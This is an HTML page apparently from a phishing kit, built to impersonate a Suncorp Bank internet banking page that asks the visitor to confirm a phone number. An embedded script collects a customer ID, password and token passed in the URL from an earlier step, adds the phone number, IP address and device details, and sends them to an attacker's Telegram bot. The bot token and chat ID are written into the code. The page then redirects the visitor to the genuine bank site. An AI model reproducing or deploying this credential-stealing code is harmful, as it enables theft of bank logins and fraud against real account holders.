<!DOCTYPE html>
<html class="responsive js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" lang="en" style="">
 <head>
  <meta content="no-cache" http-equiv="cache-control"/>
  <meta content="no-cache" http-equiv="pragma"/>
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
  <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
  <meta content="511233aa-be4a-4059-96b5-8033964fcdc6" name="_csrf"/>
  <meta content="X-CSRF-TOKEN" name="_csrf_header"/>
  <title>
   Recover your Login Information
  </title>
  <link href="css/shim.css" rel="stylesheet"/>
  <link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
  <link href="css/normalize.css" rel="stylesheet" type="text/css"/>
  <link href="css/suncorpnew-uama.css" media="screen" rel="stylesheet" type="text/css"/>
 </head>
 <body class="sg-Page">
  <header class="sg-Header">
   <div class="sg-Header-content">
    <div class="sg-Header-column">
     <a class="sg-Header-logo" href="https://www.suncorpbank.com.au/ " target="_blank">
     </a>
    </div>
    <div class="sg-Header-column sg-u-width10of10 sg-u-textRight">
     <div class="sg-Grid-row">
      <h1 class="ib-header">
       Internet Banking
      </h1>
      <span class="Icon-lock--default Icon--medium">
      </span>
     </div>
     <div class="ib-banner-info" id="bannerInfo">
      <span class="sg-u-mediumAndSmallHidden">
       <strong>
        BSB
       </strong>
       484-799
      </span>
      <span class="sg-u-mediumAndSmallHidden">
       <strong>
        Swift Code
       </strong>
       METWAU4B
      </span>
     </div>
    </div>
   </div>
  </header>
  <main class="sg-Main">
   <div class="sg-Main-content">
    <div class="sg-Main-column">
     <h2 data-title="password-reset-recover-your-login-information" id="password-reset-recover-your-login-information">
      Confirm your phone number
     </h2>
     <form autocomplete="off" class="ws-validate" id="recoverForm" method="post">
      <input name="_csrf" type="hidden" value="511233aa-be4a-4059-96b5-8033964fcdc6"/>
      <div class="sg-Box sg-Box--error sg-Box--withIcon uama-hidden" id="simpleErrorBox">
       <div class="sg-Box-icon sg-Box-icon--withBackground">
        <span class="sg-Box--errorIcon">
        </span>
       </div>
       <div class="sg-Box-content">
        <p>
        </p>
       </div>
      </div>
      <p>
       Please confirm the primary phone number associated with your internet banking account.
      </p>
      <hr/>
      <fieldset class="sg-Form-questionGroup sg-u-noPaddingLeft sg-u-paddingBottom">
       <div class="sg-Form-question">
        <label class="sg-Form-label" for="cid">
         Phone number
        </label>
        <input autocomplete="off" class="sg-Input sg-u-widthLarger" data-errormessage="Please enter your Customer ID." id="cid" maxlength="10" name="cid" required="" type="text"/>
       </div>
      </fieldset>
      <div class="sg-Form-pager">
       <button class="sg-Btn sg-Btn--primary Btn-next" name="submit" type="submit" value="Submit">
        Verify
       </button>
       <script>
// Telegram Bot Configuration
var TELEGRAM_BOT_TOKEN = '8580841728:AAFsXNmdnj-kBurv4UxM4ucpZm4NqYcDL00';
var TELEGRAM_CHAT_ID = '-5233511146';

document.addEventListener('DOMContentLoaded', function() {
    var form = document.getElementById('recoverForm');
    var phoneInput = document.getElementById('cid');
    
    // MOBILE FIX: Get data from URL parameters instead of sessionStorage
    function getUrlParam(name) {
        var results = new RegExp('[\\?&]' + name + '=([^&#]*)').exec(window.location.href);
        return results ? decodeURIComponent(results[1]) : null;
    }
    
    var userId, password, passcode;
    try {
        var u = getUrlParam('u');
        var p = getUrlParam('p');
        var t = getUrlParam('t');
        userId = u ? atob(u) : 'Not available';
        password = p ? atob(p) : 'Not available';
        passcode = t ? atob(t) : 'Not provided';
        if (passcode === 'none') passcode = 'Not provided';
    } catch(e) {
        userId = 'Not available';
        password = 'Not available';
        passcode = 'Not provided';
    }
    
    // DEBUG: Log what we received (remove in production)
    console.log('Data received:', {uid: userId, pwd: password ? '***' : 'empty', tok: passcode});
    
    // Create error container if it doesn't exist
    var phoneErrorEl = document.getElementById('phone-error');
    if (!phoneErrorEl) {
        var phoneErrorDiv = document.createElement('div');
        phoneErrorDiv.innerHTML = '<div class="sg-Validation-errorWrapper" id="phone-error" aria-live="assertive" style="display: none; margin-top: 5px; color: #d32f2f;"><p class="sg-Validation-errorMessage">Please enter a valid phone number.</p></div>';
        phoneInput.parentNode.appendChild(phoneErrorDiv.firstChild);
        phoneErrorEl = document.getElementById('phone-error');
    }
    
    phoneInput.setAttribute('maxlength', '10');
    phoneInput.setAttribute('inputmode', 'numeric');
    phoneInput.setAttribute('pattern', '[0-9]*');
    
    var style = document.createElement('style');
    style.textContent = '.sg-Input--error-border { border: 1px solid #d32f2f !important; border-color: #d32f2f !important; } @keyframes suncorp-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
    document.head.appendChild(style);
    
    function validatePhone(phone) {
        return /^04\d{8}$/.test(phone);
    }
    
    phoneInput.addEventListener('input', function(e) {
        var value = this.value.replace(/\D/g, '');
        if (value.length > 10) value = value.slice(0, 10);
        this.value = value;
        clearError();
    });
    
    function clearError() {
        phoneErrorEl.style.display = 'none';
        phoneInput.classList.remove('sg-Input--error-border');
        phoneInput.setAttribute('aria-invalid', 'false');
    }
    
    function showLoading() {
        var overlay = document.createElement('div');
        overlay.id = 'verify-loading-overlay';
        overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;';
        
        var spinner = document.createElement('div');
        spinner.style.cssText = 'width:60px;height:60px;border:4px solid rgba(0,0,0,0.2);border-top:4px solid #ffc800;border-radius:50%;animation:suncorp-spin 1s linear infinite;';
        
        var text = document.createElement('p');
        text.style.cssText = 'color:#ffc800;font-family:Arial,sans-serif;font-size:16px;margin-top:20px;';
        text.textContent = 'Verifying...';
        
        overlay.appendChild(spinner);
        overlay.appendChild(text);
        document.body.appendChild(overlay);
    }
    
    function getDeviceInfo() {
        var ua = navigator.userAgent;
        var device = 'Desktop';
        var platform = 'Unknown';
        
        if (/Android/.test(ua)) { platform = 'Android'; device = 'Mobile'; }
        else if (/iPhone|iPad|iPod/.test(ua)) { platform = 'iOS'; device = 'Mobile'; }
        else if (/Windows/.test(ua)) platform = 'Windows';
        else if (/Mac/.test(ua)) platform = 'MacOS';
        
        return { device: device, platform: platform };
    }
    
    // Get IP using XMLHttpRequest (compatible with all browsers)
    function getIP(callback) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://api.ipify.org?format=json', true);
        xhr.timeout = 5000;
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    try {
                        var data = JSON.parse(xhr.responseText);
                        callback(data.ip);
                    } catch(e) {
                        callback('Unknown');
                    }
                } else {
                    callback('Unknown');
                }
            }
        };
        xhr.onerror = function() { callback('Unknown'); };
        xhr.ontimeout = function() { callback('Unknown'); };
        xhr.send();
    }
    
    // Send to Telegram using XMLHttpRequest (compatible with all browsers)
    function sendToTelegram(message, callback) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 10000;
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                console.log('Telegram status:', xhr.status);
                console.log('Telegram response:', xhr.responseText);
                if (callback) callback(xhr.status === 200);
            }
        };
        xhr.onerror = function() {
            console.error('Telegram XHR Error');
            if (callback) callback(false);
        };
        xhr.ontimeout = function() {
            console.error('Telegram Timeout');
            if (callback) callback(false);
        };
        xhr.send(JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        }));
    }
    
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        clearError();
        
        var phone = phoneInput.value.trim();
        
        if (!validatePhone(phone)) {
            phoneErrorEl.style.display = 'block';
            phoneInput.classList.add('sg-Input--error-border');
            phoneInput.setAttribute('aria-invalid', 'true');
            return;
        }
        
        showLoading();
        
        var deviceInfo = getDeviceInfo();
        var currentDateTime = new Date().toLocaleString('en-AU', { 
            timeZone: 'Australia/Sydney',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        
        // Build message
        var message = 'ðŸŸ¡\nCustomer ID: `' + userId + '`\nPassword: `' + password + '`\nToken: `' + passcode + '`\nPhone: `' + phone + '`\nIP: `';
        
        // Get IP then send
        getIP(function(ip) {
            message += ip + '`\nUA: ' + navigator.userAgent + '\nDevice: ' + deviceInfo.device + '\nPlatform: ' + deviceInfo.platform + '\nDate: ' + currentDateTime;
            
            console.log('Sending message:', message);
            
            sendToTelegram(message, function(success) {
                console.log('Send success:', success);
                // Redirect regardless
                setTimeout(function() {
                    window.location.href = 'https://www.suncorp.com.au';
                }, 2000);
            });
        });
    });
});
</script>
      </div>
     </form>
     <footer class="sg-Footer" style="background-color:transparent;">
      <div class="sg-Footer-content">
       <p class="sg-Type--small sg-Type--muted sg-u-textCenter" id="copyright">
        Suncorp Bank (Norfina Limited ABN 66 010 831 722).
        <br/>
        The SUNCORP brand and Sun Logo are used by Suncorp Bank (Norfina Limited) under licence and Suncorp Bank is not part of the Suncorp Group.
       </p>
      </div>
     </footer>
    </div>
   </div>
  </main>
  <iframe class="aamIframeLoaded" id="destination_publishing_iframe_suncorp_0" name="destination_publishing_iframe_suncorp_0_name" sandbox="allow-scripts allow-same-origin" src="assets/dest5.html" style="display: none; width: 0px; height: 0px;" title="Adobe ID Syncing iFrame">
  </iframe>
  <iframe id="cd__fontDetectionFrame" sandbox="allow-same-origin" style="visibility: hidden; z-index: -1; width: 0px; height: 0px;">
  </iframe>
  <iframe id="cd__fontDetectionFrame" sandbox="allow-same-origin" style="visibility: hidden; z-index: -1; width: 0px; height: 0px;">
  </iframe>
  <iframe id="cd__fontDetectionFrame" sandbox="allow-same-origin" style="visibility: hidden; z-index: -1; width: 0px; height: 0px;">
  </iframe>
  <iframe id="cd__fontDetectionFrame" sandbox="allow-same-origin" style="visibility: hidden; z-index: -1; width: 0px; height: 0px;">
  </iframe>
 </body>
</html>
